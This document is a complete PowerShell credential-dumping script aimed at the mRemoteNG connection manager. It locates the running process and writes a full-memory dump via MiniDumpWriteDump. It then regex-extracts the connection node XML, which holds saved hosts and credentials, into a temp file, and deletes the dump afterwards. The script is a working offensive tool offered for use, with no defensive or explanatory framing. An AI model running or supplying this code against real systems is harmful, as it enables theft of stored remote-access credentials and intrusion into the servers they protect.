$processName = "mRemoteNG"

Write-Host "[+] Check if process $processName is runnnig..."
$process = Get-Process -Name $processName -ErrorAction SilentlyContinue
if (-not $process) {
    Write-Error "[-] Process '$processName' not found."
    exit
}

$procId = $process.Id
Write-Host "[+] Process found. PID: $procId"

$tempDir = [System.IO.Path]::GetTempPath()
$timestamp = (Get-Date -Format "yyyyMMdd_HHmmss")
$dumpFilePath = Join-Path -Path $tempDir -ChildPath "mRemoteNG_$timestamp.dmp"
Write-Host "[+] Creating memory dump in $dumpFilePath..."

Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;

public class MiniDump
{
    [Flags]
    public enum MiniDumpType : uint
    {
        MiniDumpNormal = 0x00000000,
        MiniDumpWithDataSegs = 0x00000001,
        MiniDumpWithFullMemory = 0x00000002,
        MiniDumpWithHandleData = 0x00000004,
        MiniDumpFilterMemory = 0x00000008,
        MiniDumpScanMemory = 0x00000010,
        MiniDumpWithUnloadedModules = 0x00000020,
        MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
        MiniDumpFilterModulePaths = 0x00000080,
        MiniDumpWithProcessThreadData = 0x00000100,
        MiniDumpWithPrivateReadWriteMemory = 0x00000200,
        MiniDumpWithoutOptionalData = 0x00000400,
        MiniDumpWithFullMemoryInfo = 0x00000800,
        MiniDumpWithThreadInfo = 0x00001000,
        MiniDumpWithCodeSegs = 0x00002000,
        MiniDumpWithoutAuxiliaryState = 0x00004000,
        MiniDumpWithFullAuxiliaryState = 0x00008000,
        MiniDumpWithPrivateWriteCopyMemory = 0x00010000,
        MiniDumpIgnoreInaccessibleMemory = 0x00020000,
        MiniDumpValidTypeFlags = 0x0003ffff
    }

    [DllImport("Dbghelp.dll", SetLastError = true)]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        int processId,
        IntPtr hFile,
        MiniDumpType dumpType,
        IntPtr exceptionParam,
        IntPtr userStreamParam,
        IntPtr callbackParam);
}
"@

$processHandle = [System.Diagnostics.Process]::GetProcessById($procId).Handle

$fileStream = [System.IO.File]::Create($dumpFilePath)
$fileHandle = $fileStream.SafeFileHandle.DangerousGetHandle()

try {
    $result = [MiniDump]::MiniDumpWriteDump(
        $processHandle,
        $procId,
        $fileHandle,
        [MiniDump+MiniDumpType]::MiniDumpWithFullMemory,
        [IntPtr]::Zero,
        [IntPtr]::Zero,
        [IntPtr]::Zero
    )

    if ($result) {
        Write-Host "[+] Memory dump created successfully on: $dumpFilePath"
    } else {
        throw "[-] Failed to create memory dump. Error code: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    }
} catch {
    Write-Error "[-] Error to creating memory dump: $_"
} finally {
    $fileStream.Close()
}

Write-Host "[+] Reading memory dump..."

$regex = '<Node(.*?)(?=/>)\/>'
$outputFile = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath "mRemoteNG_confCons.xml"

try {
    $content = Get-Content -Path $dumpFilePath -Raw
    $matches = [regex]::Matches($content, $regex)

    if ($matches.Count -gt 0) {
        $xmlContent = "<Nodes>`n$($matches | ForEach-Object { $_.Value })`n</Nodes>"
        Set-Content -Path $outputFile -Value $xmlContent
        Write-Host "[+] XML file saved in: $outputFile"
        Write-Host "[+] Done!"
    } else {
        Write-Host "[-] No matches found in dump."
    }
} catch {
    Write-Error "[-] Error to creating memory dump: $_"
} finally {
    # Remover o arquivo de dump
    if (Test-Path -Path $dumpFilePath) {
        Remove-Item -Path $dumpFilePath -Force
        Write-Host "[+] Dump file deleted: $dumpFilePath"
    }
}

# try {
#     if (Test-Path -Path $outputFile) {
#         Remove-Item -Path $outputFile -Force
#         Write-Host "[*] Arquivo XML deletado: $outputFile"
#     }
# } catch {
#     Write-Error "Erro ao deletar o arquivo XML: $_"
# }